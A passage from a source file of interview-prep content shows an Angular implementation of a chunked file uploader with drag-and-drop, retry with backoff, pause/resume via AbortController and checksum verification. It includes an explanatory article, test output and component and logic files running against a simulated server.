      inflight.delete(chunk.index);
    }
  }

  function pump() {
    if (status !== "uploading") return;
    if (failed !== null) {
      status = "error";
      for (const c of inflight.values()) c.abort();
      emit();
      return;
    }
    if (done.size === plan.length) {
      finish();
      return;
    }
    for (const chunk of plan) {
      if (inflight.size >= concurrency) break;
      if (done.has(chunk.index) || inflight.has(chunk.index)) continue;
      send(chunk).then(() => {
        emit();
        pump();
      });
    }
  }

  async function finish() {
    status = "verifying";
    emit();
    const [server_, local] = await Promise.all([
      server.complete(id, plan.length),
      checksum(file),
    ]);
    const ok = server_.size === file.size && server_.checksum === local;
    status = ok ? "done" : "error";
    message = ok
      ? \`Verified: \${fmtBytes(server_.size)}, checksum \${local}\`
      : "Checksum mismatch";
    emit();
  }

  const api = {
    id,
    pause() {
      if (status !== "uploading") return;
      status = "paused";
      for (const c of inflight.values()) c.abort();
      emit();
    },
    resume() {
      if (status !== "paused") return;
      status = "uploading";
      emit();
      pump();
    },
    retry() {
      if (status !== "error" || failed === null) return;
      failed = null;
      message = "";
      status = "uploading";
      emit();
      pump();
    },
    cancel() {
      status = "cancelled";
      for (const c of inflight.values()) c.abort();
      emit();
    },
  };
  queueMicrotask(() => {
    emit();
    pump();
  });
  return api;
}
`,
        },
      },
      angular: {
        answer: `**Target Audience:** Angular developers preparing for a machine coding round. Assumes standalone components, signals and the built-in control flow.
**Difficulty:** Hard

> **How to read this doc:** Plain words first, then a <code>📌 Interview term:</code> callout. "Verified" output was printed by the real code: this Angular 22.2.3 component in jsdom, compiled AOT with strict templates and again with runtime JIT (the playground mode), against a simulated server with real timers, and in headless Chromium 141 with a real \`DragEvent\` and a real file chooser.

## 1. Why This Even Matters — A Story First

Movers do not carry a house in one box. They use many small boxes and carry two at a time. A dropped box is picked up again, a rain pause means carrying on later with only what is left in the van, and an inventory check at the end proves nothing was lost. A chunked uploader is that plan: \`Blob.slice\`, a two-request pump, retries with backoff, pause by aborting, and a checksum.

## 2. Plan and the Signal Model

| Piece | Angular tool | Notes |
| :--- | :--- | :--- |
| Upload logic | \`uploader.ts\`, plain TypeScript | \`createUpload\`, \`chunkPlan\`, \`checksum\`, \`createFakeServer\`. |
| Controllers | \`private controllers = new Map<string, Controller>()\` | Never rendered. |
| \`uploads\` | \`signal<Snapshot[]>([])\` | Updated immutably from the controller callback. |
| \`chunkSize\`, \`offline\`, \`dragging\` | \`signal\` | \`[value]\` / \`(change)\` bindings. |
| Teardown | \`ngOnDestroy\` | Cancels every controller. |

📌 **Interview term: Snapshots into a signal** — the controller calls \`onUpdate(snapshot)\` from timers and promise callbacks, outside any template event. In a zoneless app, nothing would re-render after a plain field write there. Writing the snapshot into a signal schedules the render ([zoneless Angular](/interview-question/what-is-zoneless-angular-and-how-does-it-improve-performance-in-angular-18)):

\`\`\`ts
addFiles(list: FileList | File[] | null | undefined) {
  for (const file of Array.from(list || [])) {
    const c = createUpload(
      file,
      this.chunkSize(),
      this.server,
      (snap) =>
        this.uploads.update((all) =>
          all.some((u) => u.id === snap.id)
            ? all.map((u) => (u.id === snap.id ? snap : u))
            : [...all, snap],
        ),
    );
    this.controllers.set(c.id, c);
  }
}
\`\`\`

## 3. Build It Step by Step

### 3.1 Typed chunk plan and endpoint

\`\`\`ts
export type Chunk = { index: number; start: number; end: number };
export function chunkPlan(size: number, chunkSize: number): Chunk[] {
  // a 0-byte file still gets one empty chunk
  const total = Math.max(1, Math.ceil(size / chunkSize));
  return Array.from({ length: total }, (_, i) => ({
    index: i,
    start: i * chunkSize,
    end: Math.min(size, (i + 1) * chunkSize),
  }));
}
\`\`\`

\`file.slice(start, end)\` is a lazy byte range. The simulated server has these rules:

- Each request waits 120 ms and rejects with an \`AbortError\` when its signal aborts.
- Every 4th chunk fails its first attempt, so the demo is deterministic.
- An offline switch makes every request fail.
- \`complete()\` reassembles the parts by index and returns size plus an FNV-1a checksum, which the client compares with its own.

📌 **Interview term: \`AbortSignal\`** — the cancellation token that \`fetch\` and the fake server both honour. Pause is \`controller.abort()\` on every in-flight chunk ([aborting fetch](/interview-question/how-do-you-abort-a-fetch-api-request-using-abortcontroller)).

### 3.2 Retry and the pump

\`send(chunk)\` makes up to 4 attempts, waiting 100, 200 and 400 ms between failures. It returns quietly on an abort or when the upload is no longer \`"uploading"\`.

\`pump()\` keeps 2 chunks in flight, and every completed \`send\` calls it again. Pump also handles the end states: it finishes when every chunk is \`done\`, and it moves to \`"error"\` once a chunk has used up its attempts. Resume and Retry simply call \`pump()\`. Only chunks missing from \`done\` are sent.

📌 **Interview term: Exponential backoff** — longer waits after each failure; add jitter in production ([promiseRetry](/interview-question/implement-promiseretry-fn-retries-delay-with-exponential-backoff)).

### 3.3 Template

\`\`\`html
<div
  class="up-zone"
  [class.over]="dragging()"
  data-testid="zone"
  (dragenter)="onDragEnter($event)"
  (dragleave)="onDragLeave($event)"
  (dragover)="onDragOver($event)"
  (drop)="onDrop($event)"
>
  <p>{{ dragging() ? "Release to upload" : "Drag files here" }}</p>
  <button type="button" (click)="picker.click()">Browse files</button>
  <input
    #picker
    type="file"
    multiple
    hidden
    data-testid="picker"
    (change)="onPick($event)"
  />
</div>
@for (u of uploads(); track u.id) {
  <li [attr.data-upload]="u.name">
    <div
      role="progressbar"
      [attr.aria-label]="u.name + ' upload'"
      aria-valuemin="0"
      aria-valuemax="100"
      [attr.aria-valuenow]="pct(u)"
    >
      <div [style.width.%]="pct(u)"></div>
    </div>
    <span aria-live="polite"
      >{{ u.status }}{{ u.message ? ": " + u.message : "" }}</span
    >
    @switch (u.status) {
      @case ("uploading") {
        <button type="button" (click)="ctrl(u).pause()">Pause</button>
      }
      @case ("paused") {
        <button type="button" (click)="ctrl(u).resume()">Resume</button>
      }
      @case ("error") {
        <button type="button" (click)="ctrl(u).retry()">Retry</button>
      }
    }
  </li>
}
\`\`\`

📌 **Interview term: Template reference variable** — \`#picker\` names the \`<input>\` inside the template, so \`picker.click()\` needs no \`@ViewChild\`. The first draft had both a \`#picker\` and a \`@ViewChild("picker") picker\` property, and called \`picker.nativeElement.click()\`. AOT with strict templates rejected it, because inside the template \`picker\` is the template variable (an \`HTMLInputElement\`), which shadows the class property and has no \`nativeElement\`. Removing the \`@ViewChild\` fixed it.

### 3.4 Drag handlers

\`\`\`ts
private stop(e: Event) {
  e.preventDefault();
  e.stopPropagation();
}
onDragEnter(e: DragEvent) {
  this.stop(e);
  this.dragDepth++;
  this.dragging.set(true);
}
onDragLeave(e: DragEvent) {
  this.stop(e);
  if (--this.dragDepth <= 0) {
    this.dragDepth = 0;
    this.dragging.set(false);
  }
}
onDragOver(e: DragEvent) {
  this.stop(e);
  if (e.dataTransfer) e.dataTransfer.dropEffect = "copy";
}
onDrop(e: DragEvent) {
  this.stop(e);
  this.dragDepth = 0;
  this.dragging.set(false);
  this.addFiles(e.dataTransfer?.files);
}
\`\`\`

📌 **Interview term: Drop target** — \`dragover\` must be cancelled, or \`drop\` never fires. A depth counter stops the highlight flickering when the pointer crosses the zone's own children.

## 4. Verified

jsdom has \`File\` and \`Blob.slice\` but no \`DragEvent\` or \`DataTransfer\`. The driver dispatched plain events with a fake \`dataTransfer = { files, dropEffect }\` and set the file input's \`files\` itself. AOT and JIT printed the same lines, identical to React and Vue:

\`\`\`text
dragenter x2, dragleave x1 -> zone class: up-zone over | Release to upload
dragover defaultPrevented: true | dropEffect: copy
drop notes.txt (1 KB chunks) -> 10.3 KB · chunk 0/11 | 0% | uploading | buttons: Pause | zone class: up-zone
first retry (~240 ms) -> 10.3 KB · chunk 3/11 · 1 retried | 29% | uploading | buttons: Pause
paused -> 10.3 KB · chunk 3/11 · 1 retried | 29% | paused | buttons: Resume || 500 ms later: 10.3 KB · chunk 3/11 · 1 retried | 29% | paused | buttons: Resume
resumed, finished in under 2 s -> 10.3 KB · chunk 11/11 · 2 retried | 100% | done: Verified: 10.3 KB, checksum 4470522a | buttons: none
picker photo.bin (4 KB chunks, offline) -> 8.8 KB · chunk 0/3 | 0% | uploading | buttons: Pause
offline -> 8.8 KB · chunk 0/3 · 6 retried | 0% | error: Chunk 1 failed after 4 attempts: Network error | buttons: Retry
online + Retry -> 8.8 KB · chunk 3/3 · 6 retried | 100% | done: Verified: 8.8 KB, checksum 63afb8cd | buttons: none
0-byte file -> 0 B · chunk 1/1 | 100% | done: Verified: 0 B, checksum 811c9dc5 | buttons: none
\`\`\`

The snapshot is taken when the first retry appears (about 240 ms), not after a fixed sleep. A fixed 300 ms read was flaky between \`3/11\` and \`4/11\`, because the next chunk lands at about 360 ms. Finish time is only checked to be under 2 s.

Headless Chromium 141 (playwright-core) with a real \`DataTransfer\`, \`DragEvent\`s and Playwright's file chooser:

\`\`\`text
[chromium:angular] DragEvent prevented enter/over/drop: true/true/true | class while over: "up-zone over" | drag.txt: done: Verified: 4.9 KB, checksum 616035e5 | picked.txt: done: Verified: 2.9 KB, checksum 02f9fe2d | console errors: none
\`\`\`

Styling, screen reader output and a real network were not checked. The server is simulated.

## 5. Edge Cases and Accessibility

| Concern | Handling |
| :--- | :--- |
| 0-byte file | One empty chunk |
| Updates from timers | Written to a signal, so zoneless Angular renders them |
| Pause during backoff | \`send\` re-checks \`status\` after the sleep |
| Destroy mid-upload | \`ngOnDestroy\` cancels all controllers |
| Keyboard | A real Browse button |
| Progress | \`role="progressbar"\` with \`[attr.aria-valuenow]\`, and a live status |

## 6. Common Pitfalls

- **Plain fields for upload state in a zoneless app.** Callbacks from timers never trigger a render.
- **No \`preventDefault\` on \`dragover\`.** The drop never fires.
- **\`@ViewChild\` and a template variable with the same name.** The template variable wins inside the template.
- **Restarting from chunk 0 on resume.** Send only unacknowledged chunks.
- **Retrying non-retryable errors** such as 413 or 403.

## 7. How to Answer in an Interview

<div style="background:#1c140a;border:2px solid #f9a825;border-radius:10px;padding:20px 24px;margin:20px 0;">

<div style="color:#ffca28;font-size:1.15em;font-weight:bold;margin-bottom:16px;">🎤 How to Answer in an Interview</div>

<div style="color:#e0a83e;font-size:0.8em;font-weight:bold;text-transform:uppercase;letter-spacing:0.6px;margin:0 0 10px 0;">The 60-Second Answer</div>

<blockquote style="border-left:3px solid #f9a825;margin:10px 0;padding:2px 0 2px 14px;color:#f0e2c8;">
<strong style="color:#ffca28;">1. Plan:</strong> <span style="color:#f0e2c8;">"Typed <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">chunkPlan</code> ranges and lazy <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">Blob.slice</code>, with one empty chunk for a 0-byte file."</span>
</blockquote>

<blockquote style="border-left:3px solid #f9a825;margin:10px 0;padding:2px 0 2px 14px;color:#f0e2c8;">
<strong style="color:#ffca28;">2. Controller:</strong> <span style="color:#f0e2c8;">"A plain TypeScript <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">createUpload</code> with a pump holding 2 requests in flight, snapshots out, and no Angular imports."</span>
</blockquote>

<blockquote style="border-left:3px solid #f9a825;margin:10px 0;padding:2px 0 2px 14px;color:#f0e2c8;">
<strong style="color:#ffca28;">3. Failure:</strong> <span style="color:#f0e2c8;">"Backoff of 100, 200 and 400 ms, giving up after 4 attempts, and Retry resumes from the missing chunks."</span>
</blockquote>

<blockquote style="border-left:3px solid #f9a825;margin:10px 0;padding:2px 0 2px 14px;color:#f0e2c8;">
<strong style="color:#ffca28;">4. Pause:</strong> <span style="color:#f0e2c8;">"Abort the in-flight <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">AbortController</code>s; resume sends the rest; a checksum confirms the file."</span>
</blockquote>

<blockquote style="border-left:3px solid #f9a825;margin:10px 0;padding:2px 0 2px 14px;color:#f0e2c8;">
<strong style="color:#ffca28;">5. Angular layer:</strong> <span style="color:#f0e2c8;">"Snapshots into a <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">signal</code>, <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">#picker</code> for Browse, <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">preventDefault</code> on <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">dragover</code>, a depth counter and a <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">progressbar</code>."</span>
</blockquote>

<div style="color:#e0a83e;font-size:0.8em;font-weight:bold;text-transform:uppercase;letter-spacing:0.6px;margin:22px 0 10px 0;border-top:1px solid #4a3a1a;padding-top:16px;">Follow-Up Questions to Expect</div>

<div style="background:#3d2810;border-radius:8px 8px 0 0;padding:10px 16px;margin:12px 0 0 0;">
<span style="color:#ff8a65;font-weight:bold;">❓ Q:</span> <span style="color:#ffe0b2;">Would you use <code style="background:#4a3418;color:#ffe0b2;padding:1px 5px;border-radius:3px;">HttpClient</code>?</span>
</div>
<div style="background:#151a15;border:1px solid #f9a825;border-top:none;border-radius:0 0 8px 8px;padding:10px 16px;margin:0 0 14px 0;">
<span style="color:#66bb6a;font-weight:bold;">💡 A:</span> <span style="color:#d8d8d8;">Yes for real uploads: <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">HttpClient</code> with <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">reportProgress: true</code> and <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">observe: "events"</code> gives upload progress, and unsubscribing cancels the request, which fits pause.</span>
</div>

<div style="background:#3d2810;border-radius:8px 8px 0 0;padding:10px 16px;margin:0;">
<span style="color:#ff8a65;font-weight:bold;">❓ Q:</span> <span style="color:#ffe0b2;">Where would the controller live?</span>
</div>
<div style="background:#151a15;border:1px solid #f9a825;border-top:none;border-radius:0 0 8px 8px;padding:10px 16px;margin:0 0 14px 0;">
<span style="color:#66bb6a;font-weight:bold;">💡 A:</span> <span style="color:#d8d8d8;">In an injectable service if uploads must survive navigation between routes, exposing a signal of snapshots.</span>
</div>

<div style="background:#3d2810;border-radius:8px 8px 0 0;padding:10px 16px;margin:0;">
<span style="color:#ff8a65;font-weight:bold;">❓ Q:</span> <span style="color:#ffe0b2;">How would you resume after a reload?</span>
</div>
<div style="background:#151a15;border:1px solid #f9a825;border-top:none;border-radius:0 0 8px 8px;padding:10px 16px;margin:0 0 14px 0;">
<span style="color:#66bb6a;font-weight:bold;">💡 A:</span> <span style="color:#d8d8d8;">Persist the upload id and a file fingerprint, ask the server which parts it has, and have the user pick the file again.</span>
</div>

<div style="background:#3d2810;border-radius:8px 8px 0 0;padding:10px 16px;margin:0;">
<span style="color:#ff8a65;font-weight:bold;">❓ Q:</span> <span style="color:#ffe0b2;">How would you test it?</span>
</div>
<div style="background:#151a15;border:1px solid #f9a825;border-top:none;border-radius:0 0 8px 8px;padding:10px 16px;margin:0;">
<span style="color:#66bb6a;font-weight:bold;">💡 A:</span> <span style="color:#d8d8d8;">Unit-test <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">createUpload</code> with a fake server and fake timers, then one TestBed test that dispatches a synthetic drop and waits for the done status.</span>
</div>

</div>

## 8. Quick Glossary

| Term | Plain meaning |
| :--- | :--- |
| **Snapshots into a signal** | Controller updates that trigger zoneless renders |
| **\`AbortSignal\`** | The token that cancels a request |
| **Exponential backoff** | Longer waits after each failure |
| **Template reference variable** | A \`#name\` usable inside the template |
| **Drop target** | An element whose \`dragover\` is cancelled |

---
**Conclusion:** The Angular uploader keeps all upload logic in typed, framework-free code: lazy chunks, a two-request pump, backoff, pause by abort, and a checksum. The component writes snapshots into a signal, so updates from timers render in a zoneless app, and it uses a template reference variable for the Browse button. Strict AOT compilation caught a shadowed \`@ViewChild\`, and jsdom and real Chromium confirmed the behaviour.`,
        files: {
          "/src/app/app.component.ts": `import { Component } from "@angular/core";
import { FileUploaderComponent } from "./file-uploader.component";

@Component({
  selector: "app-root",
  standalone: true,
  imports: [FileUploaderComponent],
  styles: [
    \`
      :host {
        display: block;
        min-height: 100vh;
        margin: 0;
        background: #0f1115;
        color: #e6e6e6;
        font-family: system-ui, sans-serif;
      }
      .page {
        max-width: 600px;
        margin: 0 auto;
        padding: 20px 16px;
      }
      :host ::ng-deep .up-opts {
        display: flex;
        flex-wrap: wrap;
        gap: 16px;
        align-items: center;
        font-size: 14px;
        margin-bottom: 10px;
        color: #c9d1d9;
      }
      :host ::ng-deep select {
        background: #171a21;
        color: #e6e6e6;
        border: 1px solid #2c3340;
        border-radius: 6px;
        padding: 4px 6px;
      }
      :host ::ng-deep .up-zone {
        border: 2px dashed #3a4250;
        border-radius: 12px;
        padding: 28px 16px;
        text-align: center;
        background: #13161c;
        transition:
          background 0.15s,
          border-color 0.15s;
      }
      :host ::ng-deep .up-zone.over {
        border-color: #f9a825;
        background: #1c140a;
      }
      :host ::ng-deep .up-zone p {
        margin: 0 0 10px;
        color: #9aa4b2;
      }
      :host ::ng-deep button {
        background: #222834;
        color: #e6e6e6;
        border: 1px solid #2c3340;
        border-radius: 8px;
        padding: 5px 12px;
        cursor: pointer;
        font: inherit;
        font-size: 13px;
      }
      :host ::ng-deep .up-list {
        list-style: none;
        padding: 0;
        margin: 16px 0 0;
        display: flex;
        flex-direction: column;
        gap: 10px;
      }
      :host ::ng-deep .up-list li {
        background: #171a21;
        border: 1px solid #2c3340;
        border-radius: 10px;
        padding: 10px 12px;
      }
      :host ::ng-deep .up-row {
        display: flex;
        justify-content: space-between;
        gap: 8px;
        align-items: center;
        flex-wrap: wrap;
        font-size: 14px;
      }
      :host ::ng-deep .up-meta,
      :host ::ng-deep .up-status {
        color: #9aa4b2;
        font-size: 12px;
        word-break: break-word;
      }
      :host ::ng-deep .up-bar {
        height: 6px;
        background: #262c36;
        border-radius: 3px;
        margin: 8px 0;
        overflow: hidden;
      }
      :host ::ng-deep .up-fill {
        height: 100%;
        background: #f9a825;
        transition: width 0.2s;
      }
      :host ::ng-deep .up-fill.done {
        background: #66bb6a;
      }
      :host ::ng-deep .up-fill.error {
        background: #ef5350;
      }
      :host ::ng-deep .up-fill.paused {
        background: #8b949e;
      }
    \`,
  ],
  template: \`
    <main class="page">
      <h1 style="font-size: 18px">Upload files</h1>
      <app-file-uploader />
    </main>
  \`,
})
export class AppComponent {}
`,
          "/src/app/file-uploader.component.ts": `import { Component, OnDestroy, signal } from "@angular/core";
import {
  CHUNK_SIZES,
  Controller,
  Snapshot,
  createFakeServer,
  createUpload,
  fmtBytes,
} from "./uploader";

@Component({
  selector: "app-file-uploader",
  standalone: true,
  template: \`
    <div class="up">
      <div class="up-opts">
        <label>Chunk size
          <select
            data-testid="chunk"
            [value]="chunkSize()"
            (change)="chunkSize.set(+val($event))"
          >
            @for (c of sizes; track c.value) { <option [value]="c.value" [selected]="c.value === chunkSize()">{{ c.label }}</option> }
          </select>
        </label>
        <label><input type="checkbox" data-testid="offline" [checked]="offline()" (change)="setOffline($event)" /> Simulate offline</label>
      </div>
      <div class="up-zone" [class.over]="dragging()" data-testid="zone"
        (dragenter)="onDragEnter($event)" (dragleave)="onDragLeave($event)" (dragover)="onDragOver($event)" (drop)="onDrop($event)">
        <p>{{ dragging() ? "Release to upload" : "Drag files here" }}</p>
        <button type="button" (click)="picker.click()">Browse files</button>
        <input
          #picker
          type="file"
          multiple
          hidden
          data-testid="picker"
          (change)="onPick($event)"
        />
      </div>
      <ul class="up-list" aria-label="Uploads">
        @for (u of uploads(); track u.id) {
          <li [attr.data-upload]="u.name">
            <div class="up-row">
              <strong>{{ u.name }}</strong>
              <span class="up-meta">{{ fmtBytes(u.size) }} · chunk {{ u.done }}/{{ u.total }}{{ u.retried ? " · " + u.retried + " retried" : "" }}</span>
            </div>
            <div
              role="progressbar"
              [attr.aria-label]="u.name + ' upload'"
              aria-valuemin="0"
              aria-valuemax="100"
              [attr.aria-valuenow]="pct(u)"
              class="up-bar"
            >
              <div
                [style.width.%]="pct(u)"
                [class]="'up-fill ' + u.status"
              ></div>
            </div>
            <div class="up-row">
              <span
                class="up-status"
                data-testid="status"
                aria-live="polite"
              >{{ u.status }}{{ u.message ? ": " + u.message : "" }}</span>
              <span>
                @switch (u.status) {
                  @case ("uploading") { <button type="button" (click)="ctrl(u).pause()">Pause</button> }
                  @case ("paused") { <button type="button" (click)="ctrl(u).resume()">Resume</button> }
                  @case ("error") { <button type="button" (click)="ctrl(u).retry()">Retry</button> }
                }
              </span>
            </div>
          </li>
        }
      </ul>
    </div>
  \`,
})
export class FileUploaderComponent implements OnDestroy {
  readonly sizes = CHUNK_SIZES;
  readonly fmtBytes = fmtBytes;
  private server = createFakeServer({ latency: 120 }); // simulated endpoint
  private controllers = new Map<string, Controller>(); // not render state

  // Snapshots arrive from timers and promises. Zoneless Angular re-renders
  // because each one is written to a signal.
  uploads = signal<Snapshot[]>([]);
  chunkSize = signal(1024);
  offline = signal(false);
  dragging = signal(false);
  private dragDepth = 0; // dragenter/dragleave also fire for children

  ngOnDestroy() {
    this.controllers.forEach((c) => c.cancel());
  }

  val = (e: Event) => (e.target as HTMLInputElement).value;
  ctrl = (u: Snapshot) => this.controllers.get(u.id)!;
  pct = (u: Snapshot) =>
    Math.round((u.bytes / Math.max(u.size, 1)) * 100) ||
    (u.status === "done" ? 100 : 0);

  setOffline(e: Event) {
    const v = (e.target as HTMLInputElement).checked;
    this.offline.set(v);
    this.server.setOffline(v);
  }
  addFiles(list: FileList | File[] | null | undefined) {
    for (const file of Array.from(list || [])) {
      const c = createUpload(file, this.chunkSize(), this.server, (snap) =>
        this.uploads.update((all) =>
          all.some((u) => u.id === snap.id)
            ? all.map((u) => (u.id === snap.id ? snap : u))
            : [...all, snap],
        ),
      );
      this.controllers.set(c.id, c);
    }
  }
  private stop(e: Event) {
    e.preventDefault();
    e.stopPropagation();
  }
  onDragEnter(e: DragEvent) {
    this.stop(e);
    this.dragDepth++;
    this.dragging.set(true);
  }
  onDragLeave(e: DragEvent) {
    this.stop(e);
    if (--this.dragDepth <= 0) {
      this.dragDepth = 0;
      this.dragging.set(false);
    }
  }
  onDragOver(e: DragEvent) {
    this.stop(e);
    if (e.dataTransfer) e.dataTransfer.dropEffect = "copy";
  } // required, or drop never fires
  onDrop(e: DragEvent) {
    this.stop(e);
    this.dragDepth = 0;
    this.dragging.set(false);
    this.addFiles(e.dataTransfer?.files);
  }
  onPick(e: Event) {
    const el = e.target as HTMLInputElement;
    this.addFiles(el.files);
    el.value = "";
  }
}
`,
          "/src/app/uploader.ts": `// Framework-free chunked upload logic plus a SIMULATED server (no network).
export type Snapshot = {
  id: string;
  name: string;
  size: number;
  total: number;
  done: number;
  status: string;
  message: string;
  retried: number;
  bytes: number;
};
export type Controller = {
  id: string;
  pause(): void;
  resume(): void;
  retry(): void;
  cancel(): void;
};
type Chunk = { index: number; start: number; end: number };
export type FakeServer = ReturnType<typeof createFakeServer>;

export const CHUNK_SIZES = [
  { label: "1 KB", value: 1024 },
  { label: "4 KB", value: 4096 },
  { label: "64 KB", value: 65536 },
  { label: "1 MB", value: 1048576 },
  { label: "5 MB", value: 5242880 },
];
export const fmtBytes = (n: number) =>
  n < 1024
    ? n + " B"
    : n < 1048576
      ? (n / 1024).toFixed(1) + " KB"
      : (n / 1048576).toFixed(1) + " MB";

// [start, end) byte ranges. A 0-byte file still gets one (empty) chunk.
export function chunkPlan(size: number, chunkSize: number): Chunk[] {
  const total = Math.max(1, Math.ceil(size / chunkSize));
  return Array.from({ length: total }, (_, i) => ({
    index: i,
    start: i * chunkSize,
    end: Math.min(size, (i + 1) * chunkSize),
  }));
}

// FNV-1a over the bytes: lets the "server"
// prove the reassembled file is identical.
export async function checksum(blob: Blob) {
  const bytes = new Uint8Array(await blob.arrayBuffer());
  let h = 0x811c9dc5;
  for (const b of bytes) {
    h ^= b;
    h = Math.imul(h, 0x01000193) >>> 0;
  }
  return h.toString(16).padStart(8, "0");
}

const abortError = () =>
  Object.assign(new Error("Aborted"), { name: "AbortError" });

// Simulated upload endpoint. Every 4th chunk fails its first attempt (a flaky
// network), and setOffline(true) makes every request fail.
export function createFakeServer({ latency = 120 } = {}) {
  const uploads = new Map<string, Map<number, Blob>>();
  const tries = new Map<string, number>();
  let offline = false;
  return {
    setOffline(v: boolean) {
      offline = v;
    },
    uploadChunk({
      uploadId,
      index,
      blob,
      signal,
    }: {
      uploadId: string;
      index: number;
      blob: Blob;
      signal?: AbortSignal;
    }) {
      return new Promise<{ index: number; received: number }>(
        (resolve, reject) => {
          if (signal?.aborted) return reject(abortError());
          const t = setTimeout(() => {
            signal?.removeEventListener("abort", onAbort);
            const key = uploadId + ":" + index;
            tries.set(key, (tries.get(key) || 0) + 1);
            if (offline) return reject(new Error("Network error"));
            if (index % 4 === 3 && tries.get(key) === 1)
              return reject(new Error("503 Service Unavailable"));
            if (!uploads.has(uploadId)) uploads.set(uploadId, new Map());
            uploads.get(uploadId)!.set(index, blob);
            resolve({ index, received: blob.size });
          }, latency);
          const onAbort = () => {
            clearTimeout(t);
            reject(abortError());
          };
          signal?.addEventListener("abort", onAbort, { once: true });
        },
      );
    },
    async complete(uploadId: string, total: number) {
      const parts = uploads.get(uploadId);
      const ordered = Array.from({ length: total }, (_, i) => parts?.get(i));
      if (ordered.some((p) => !p)) throw new Error("Missing chunks");
      const file = new Blob(ordered as Blob[]);
      return { size: file.size, checksum: await checksum(file) };
    },
  };
}

let seq = 0;
// One upload = one file. onUpdate(snapshot)
// is called after every change; the UI
// renders snapshots and never touches this object's internals.
export function createUpload(
  file: File,
  chunkSize: number,
  server: FakeServer,
  onUpdate: (s: Snapshot) => void,
  { concurrency = 2, retries = 3, backoff = 100 } = {},
): Controller {
  const id = "u" + ++seq;
  const plan = chunkPlan(file.size, chunkSize);
  const done = new Set<number>();
  const inflight = new Map<number, AbortController>();
  let status = "uploading",
    message = "",
    retried = 0,
    failed: number | null = null;

  const snapshot = (): Snapshot => ({
    id,
    name: file.name,
    size: file.size,
    total: plan.length,
    done: done.size,
    status,
    message,
    retried,
    bytes: [...done].reduce((n, i) => n + plan[i].end - plan[i].start, 0),
  });
  const emit = () => onUpdate(snapshot());
  const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));

  async function send(chunk: Chunk) {
    const ctrl = new AbortController();
    inflight.set(chunk.index, ctrl);
    try {
      for (let attempt = 1; ; attempt++) {
        try {
          await server.uploadChunk({
            uploadId: id,
            index: chunk.index,
            blob: file.slice(chunk.start, chunk.end),
            signal: ctrl.signal,
          });
          done.add(chunk.index);
          return;
        } catch (err) {
          const e = err as Error;
          // paused: will be re-sent on resume
          if (e.name === "AbortError" || status !== "uploading") return;
          if (attempt > retries) {
            failed = chunk.index;
            message = \`Chunk \${chunk.index + 1} failed after \${attempt} attempts: \${e.message}\`;
            return;
          }
          retried++;
          emit();
          await sleep(backoff * 2 ** (attempt - 1)); // 100, 200, 400 ms
          if (status !== "uploading") return;
        }
      }
    } finally {
      inflight.delete(chunk.index);
    }
  }

  function pump() {
    if (status !== "uploading") return;
    if (failed !== null) {
      status = "error";
      for (const c of inflight.values()) c.abort();
      emit();
      return;
    }
    if (done.size === plan.length) {
      finish();
      return;
    }
    for (const chunk of plan) {
      if (inflight.size >= concurrency) break;
      if (done.has(chunk.index) || inflight.has(chunk.index)) continue;
      send(chunk).then(() => {
        emit();
        pump();
      });
    }
  }

  async function finish() {
    status = "verifying";
    emit();
    const [server_, local] = await Promise.all([
      server.complete(id, plan.length),
      checksum(file),
    ]);
    const ok = server_.size === file.size && server_.checksum === local;
    status = ok ? "done" : "error";
    message = ok
      ? \`Verified: \${fmtBytes(server_.size)}, checksum \${local}\`
      : "Checksum mismatch";
    emit();
  }

  const api = {
    id,
    pause() {
      if (status !== "uploading") return;
      status = "paused";
      for (const c of inflight.values()) c.abort();
      emit();
    },
    resume() {
      if (status !== "paused") return;
      status = "uploading";
      emit();
      pump();
    },
    retry() {
      if (status !== "error" || failed === null) return;
      failed = null;
      message = "";
      status = "uploading";
      emit();
      pump();
    },
    cancel() {
      status = "cancelled";
      for (const c of inflight.values()) c.abort();
      emit();
    },
  };
  queueMicrotask(() => {
    emit();
    pump();
  });
  return api;
}
`,
        },
      },
    },
  },
];

export default augments;
